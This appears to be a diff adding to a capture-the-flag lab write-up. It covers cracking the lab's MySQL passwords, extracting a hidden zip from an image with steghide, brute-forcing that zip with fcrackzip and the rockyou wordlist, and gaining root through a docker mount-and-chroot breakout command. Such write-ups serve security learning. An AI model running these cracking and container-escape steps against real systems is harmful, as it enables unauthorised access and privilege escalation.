@@ -185,7 +185,9 @@ A much better terminal
 
 ![image](https://user-images.githubusercontent.com/5285547/127408800-adc970a3-4cd6-469f-bf57-5dc4a8cecab1.png)
 
-# Enum 2
+We can now get the user flag in /home/apaar/local.txt
+
+# Enum Round 2
 
 Checking the rest of the system I saw the username and password for mysql in the index page for login. 
 
@@ -232,6 +234,78 @@ mysql> select * from users;
 
 Lets see if we can crack the passwords. 
 
+![image](https://user-images.githubusercontent.com/5285547/127409290-94d20f0a-134d-4f23-aedb-e72f5f9d3670.png)
+
+```
+anurodh:masterpassword
+apaar:dontaskdonttell
+```
+
+Running linpeas again as apaar didn't show much new at all. I spent hours looking and finding not much at all. 
+I seen a port running on 127.0.0.1:9001 I haden't checked out yet, so started there.
+
+This seemed the host an apache server on port 9001, which is owned by root user. 
+
+![image](https://user-images.githubusercontent.com/5285547/127410572-9a8e1c3c-2381-4225-96d2-72616657ac28.png)
+
+I started to check the images with stego techniques. 
+
+```
+steghide info hacker-with-laptop_23-2147985341.jpg 
+"hacker-with-laptop_23-2147985341.jpg":
+  format: jpeg
+  capacity: 3.6 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "backup.zip":
+    size: 750.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+    
+steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+Enter passphrase: 
+wrote extracted data to "backup.zip".
+```
+
+Time to crack the .zip file. We can do this a few ways.
+
+```
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt hacker-with-laptop_23-2147985341.jpg backup.zip 
+found id e0ffd8ff, 'hacker-with-laptop_23-2147985341.jpg' is not a zipfile ver 2.xx, skipping
+
+PASSWORD FOUND!!!!: pw == pass1word
+
+unzip backip.zip
+Archive:  backup.zip
+[backup.zip] source_code.php password: 
+  inflating: source_code.php 
+```
+
+We can get a base64 password from the file extracted.
+
+![image](https://user-images.githubusercontent.com/5285547/127411207-bfd7ed9d-ccd5-41a8-b497-8c5f0ece0b3b.png)
+
+Using that password for anurodh we can swap user accounts. 
+Running linpeas again as anurodh shows we can use docker and its writable! (escape time)
+
+![image](https://user-images.githubusercontent.com/5285547/127411427-8210c9a0-2caf-4255-a2e6-8baed640c9ff.png)
+
+## Root
+
+Listing the images shows us some continers ready to roll. 
+
+![image](https://user-images.githubusercontent.com/5285547/127411522-b7785285-fd3f-4ca5-8b00-7454be700703.png)
+
+I know i've used the alpine exploit to escape docker before.  
+We can run the docker cm mount it with bash and save no session. 
+Then grab the last flag!
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+```  
+Credits: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout
+
+![image](https://user-images.githubusercontent.com/5285547/127411757-390e0ff5-a34d-427f-a717-76253e9011e7.png)
 
 
 
